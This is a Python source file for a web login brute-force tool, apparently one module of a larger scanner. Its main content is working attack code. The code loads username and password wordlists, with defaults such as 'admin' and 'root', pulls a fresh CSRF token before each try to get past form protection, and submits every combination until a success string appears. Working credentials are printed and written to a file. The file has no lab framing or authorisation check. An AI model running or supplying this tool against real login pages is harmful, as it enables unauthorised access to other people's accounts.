import os
import requests
from colorama import Fore, Style
from urllib.parse import urlparse

def load_wordlist(wordlist_file, default_file):
    if wordlist_file and os.path.exists(wordlist_file):
        with open(wordlist_file, 'r', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    elif os.path.exists(default_file):
        with open(default_file, 'r', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    return ['admin', 'test', 'user', 'root']

def get_csrf_token(url, csrf_field=None):
    if not csrf_field:
        return None
    
    try:
        response = requests.get(url)
        if csrf_field in response.text:
            # Very basic extraction - would need improvement for real-world use
            start = response.text.find(f'name="{csrf_field}" value="') + len(f'name="{csrf_field}" value="')
            end = response.text.find('"', start)
            return response.text[start:end]
    except:
        pass
    return None

def brute_force(url, usernames, passwords, data_template, csrf_field, success_str, verbose, output_file):
    print(f"{Fore.CYAN}[*] Starting brute force attack...{Style.RESET_ALL}")
    
    for username in usernames:
        for password in passwords:
            # Get fresh CSRF token for each attempt if needed
            csrf_token = get_csrf_token(url, csrf_field) if csrf_field else None
            
            # Prepare POST data
            data = data_template.replace('{USER}', username).replace('{PASS}', password)
            if csrf_token:
                data += f"&{csrf_field}={csrf_token}"
            
            # Parse data into dictionary
            data_dict = {}
            for pair in data.split('&'):
                key, value = pair.split('=')
                data_dict[key] = value
            
            try:
                response = requests.post(url, data=data_dict)
                
                if success_str in response.text:
                    msg = f"{Fore.GREEN}[+] Valid credentials found!{Style.RESET_ALL}"
                    msg += f"\nUsername: {username}\nPassword: {password}\n"
                    print(msg)
                    
                    if output_file:
                        output_file.write(msg + "\n")
                    return
                
                if verbose:
                    print(f"{Fore.YELLOW}[*] Trying: {username}:{password}{Style.RESET_ALL}")
            
            except Exception as e:
                print(f"{Fore.RED}[!] Error during brute force: {e}{Style.RESET_ALL}")
                continue

def scan(url, usernames_file=None, passwords_file=None, data=None, csrf_field=None, 
         success_str=None, verbose=False, output_file=None):
    # Load wordlists
    usernames = load_wordlist(usernames_file, 'payloads/wordlists/usernames.txt')
    passwords = load_wordlist(passwords_file, 'payloads/wordlists/passwords.txt')
    
    if not data:
        print(f"{Fore.RED}[!] No data template provided for brute force{Style.RESET_ALL}")
        return
    
    if not success_str:
        print(f"{Fore.RED}[!] No success string provided to identify successful logins{Style.RESET_ALL}")
        return
    
    brute_force(url, usernames, passwords, data, csrf_field, success_str, verbose, output_file)